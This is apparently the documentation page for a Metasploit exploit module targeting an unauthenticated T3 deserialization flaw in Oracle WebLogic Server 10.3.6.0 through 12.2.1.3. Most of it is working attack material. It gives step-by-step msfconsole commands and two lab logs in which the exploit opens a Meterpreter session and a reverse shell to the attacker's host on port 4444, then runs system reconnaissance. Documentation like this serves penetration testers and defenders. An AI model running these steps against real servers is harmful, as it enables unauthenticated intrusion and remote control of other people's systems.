## Description

Oracle Weblogic Server v10.3.6.0, v12.1.3.0, v12.2.1.2, and v12.2.1.3 are vulnerable to a deserialization vulnerable, which can be used to execute code on vulnerable systems. An unauthenticated user with network access via T3 could exploit the vulnerability. This module has been tested against Oracle Weblogic Server v10.3.6.0 running on Windows10 x64 using JDK v7u17.

## Vulnerable Application

[Oracle Weblogic Server v10.3.6.0](http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar), v12.1.3.0, v12.2.1.2, and v12.2.1.3.

## Verification Steps

1. `./msfconsole -q`
2. `use exploit/multi/misc/weblogic_deserialize`
3. `set rhosts <rhost>`
4. `set srvhost <srvhos>t`
5. `set srvport <srvport>`
6. `run`

## Scenarios

### Tested on Windows 10 x64 running Oracle Weblogic Server 10.3.6.0 on JDK v7u17

```
msf5 exploit(multi/misc/weblogic_deserialize) > set rhosts 172.22.222.175
rhosts => 172.22.222.175
msf5 exploit(multi/misc/weblogic_deserialize) > set srvhost 172.22.222.121
srvhost => 172.22.222.121
msf5 exploit(multi/misc/weblogic_deserialize) > set srvport 8888
srvport => 8888
msf5 exploit(multi/misc/weblogic_deserialize) > set target 1
target => 1
msf5 exploit(multi/misc/weblogic_deserialize) > run
[*] Exploit running as background job 0.
msf5 exploit(multi/misc/weblogic_deserialize) >
[*] Started reverse TCP handler on 172.22.222.121:4444
[*] Sending stage (179779 bytes) to 172.22.222.175
[*] Meterpreter session 1 opened (172.22.222.121:4444 -> 172.22.222.175:49908) at 2018-08-08 17:53:07 -0500
sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : _
OS              : Windows 10 (Build 17134).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

### Tested on Ubuntu 14.04 LTS x64 running Oracle Weblogic Server 10.3.6.0 on Sun SDK 1.6.0_29
```
msf5 > use exploit/multi/misc/weblogic_deserialize
msf5 exploit(multi/misc/weblogic_deserialize) > set rhosts 172.22.222.205
rhosts => 172.22.222.205
msf5 exploit(multi/misc/weblogic_deserialize) > set srvhost 172.22.222.207
srvhost => 172.22.222.207
msf5 exploit(multi/misc/weblogic_deserialize) > set lhost 172.22.222.207
lhost => 172.22.222.207
msf5 exploit(multi/misc/weblogic_deserialize) > set verbose true
verbose => true
msf5 exploit(multi/misc/weblogic_deserialize) > check

[+] 172.22.222.205:7001 - Detected Oracle WebLogic Server Version: 10.3.6.0
[*] 172.22.222.205:7001 The target appears to be vulnerable.
msf5 exploit(multi/misc/weblogic_deserialize) > run
[*] Exploit running as background job 0.
msf5 exploit(multi/misc/weblogic_deserialize) >
[*] Started reverse TCP handler on 172.22.222.207:4444
[*] 172.22.222.205:7001 - Sending handshake...
[*] 172.22.222.205:7001 - Sending client object payload...
[*] 172.22.222.205:7001 - Comparing host: 172.22.222.205
[*] 172.22.222.205:7001 - Sending payload to client: 172.22.222.205
[*] 172.22.222.205:7001 - Comparing host: 172.22.222.205
[*] Command shell session 1 opened (172.22.222.207:4444 -> 172.22.222.205:37168) at 2018-08-30 06:10:31 -0500
[*] 172.22.222.205:7001 - Server stopped.

msf5 exploit(multi/misc/weblogic_deserialize) > sessions -i 1
[*] Starting interaction with 1...

uname -a
Linux ubuntu 4.4.0-134-generic #160~14.04.1-Ubuntu SMP Fri Aug 17 11:07:07 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
